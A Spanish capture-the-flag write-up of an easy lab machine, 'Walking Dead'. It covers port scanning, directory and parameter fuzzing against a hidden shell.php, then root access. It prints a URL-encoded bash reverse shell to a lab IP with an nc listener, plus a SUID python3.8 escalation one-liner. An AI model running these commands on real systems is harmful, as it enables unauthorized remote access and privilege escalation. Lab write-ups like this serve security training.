---
description: '✍️ Autor: JuanR🔍 Dificultad: Fácil 📅 Fecha de creación: 13/02/2025'
---

# Walking Dead

### 🔍 RECONOCIMIENTO

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 172.17.0.2
```

para verificar la conectividad de red.

<figure><img src="../../.gitbook/assets/image (1330).png" alt=""><figcaption></figcaption></figure>

A continuación, realizamos el comando:

```bash
nmap -sVC -p- -n --min-rate 5000 172.17.0.2
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../.gitbook/assets/image (1331).png" alt=""><figcaption></figcaption></figure>

Como podemos observar durante el escaneo que el **puerto 22** perteneciente al **servicio SSH** y el **puerto 80** perteneciente al **servicio HTTP** están abiertos por lo que a continuación se indagará más.&#x20;

### 🔎 **EXPLORACIÓN**

Se utiliza el comando:

```bash
sudo nmap -sCV -p22,80 -v 172.17.0.2
```

para obtener más información sobre esos puertos específicamente.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-02-26 210100 (1).png" alt=""><figcaption></figcaption></figure>

Revisamos el puerto 80.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-02-26 210527.png" alt=""><figcaption></figcaption></figure>

Revisando el código fuente encontramos una carpeta llamado **hidden** con un archivo **shell.php**.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-02-26 210747.png" alt=""><figcaption></figcaption></figure>

Revisamos directorios.

```
gobuster dir -u "http://172.17.0.2/" -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x txt,html,php
```

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-02-26 212212.png" alt=""><figcaption></figcaption></figure>

Nos parece interesante el archivo **backup.txt**.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-02-26 212501.png" alt=""><figcaption></figcaption></figure>

Nos dice que no se pueden listar directorios. Realizamos fuzzing para un parámetro vulnerable.

```bash
 wfuzz -c --hc=404 --hh=0 -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt  "http://172.17.0.2/hidden/.shell.php?FUZZ=id"
```

<figure><img src="../../.gitbook/assets/image (1334).png" alt=""><figcaption></figcaption></figure>

### 🚀 **EXPLOTACIÓN**

Hacemos una Reverse Shell pero codificamos a URL.

{% embed url="https://www.urlencoder.io/" %}

```
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.17.0.1%2F445%200%3E%261%22
```

Nos ponemos en escucha.

```bash
nc -nlvp 445
```

Hacemos tratamiento de la [TTY](https://beafn28.gitbook.io/beafn28/preparar-ejptv2/curso-de-mario/explotacion-vulnerabilidades-web#primeros-pasos-tras-la-intrusion-tratamiento-de-la-tty).

### 🔐 **PRIVILEGIOS**

Al estar dentro y ejecutar:

```bash
whoami
```

aún no somos **root**, por lo que hacemos:

```bash
sudo -l
```

<figure><img src="../../.gitbook/assets/image (1335).png" alt=""><figcaption></figcaption></figure>

para ver si hay algo para explotar. No tenemos permisos **SUDO**. Miramos entonces **SUID**.

```
find / -perm -4000 2>/dev/null
```

{% embed url="https://gtfobins.github.io/gtfobins/python/#suid" %}

```
/usr/bin/python3.8 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

<figure><img src="../../.gitbook/assets/image (1336).png" alt=""><figcaption></figcaption></figure>
